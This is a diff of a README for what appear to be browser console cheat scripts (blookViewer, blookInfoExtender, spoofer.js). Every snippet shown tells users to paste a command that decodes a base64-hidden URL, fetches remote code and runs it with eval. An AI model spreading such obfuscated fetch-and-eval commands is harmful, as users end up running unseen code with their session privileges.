@@ -8,7 +8,7 @@
 Open console (ctrl + shift + j) and paste the following:
 
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMjc5MTQvYmxvb2tWaWV3ZXIuanM=')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMjc5MTQvYmxvb2tWaWV3ZXIuanM=')).then((r) => r.text().then(eval))
 ```
 
 
@@ -17,7 +17,7 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2
 </br>
 
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzE0NzYvYmxvb2tJbmZvRXh0ZW5kZXIuanM=')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzE0NzYvYmxvb2tJbmZvRXh0ZW5kZXIuanM=')).then((r) => r.text().then(eval))
 ```
 
 # spoofer.js
@@ -30,7 +30,7 @@ fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2
 Open console (ctrl + shift + j) and paste the following:
 
 ```js
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzA1NzIvc3Bvb2Zlci5qcw==')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZGt1cW1wdmJvL3Jhdy91cGxvYWQvdjE2MzgyMzA1NzIvc3Bvb2Zlci5qcw==')).then((r) => r.text().then(eval))
 ```
 
 ## IOS Mobile Devices
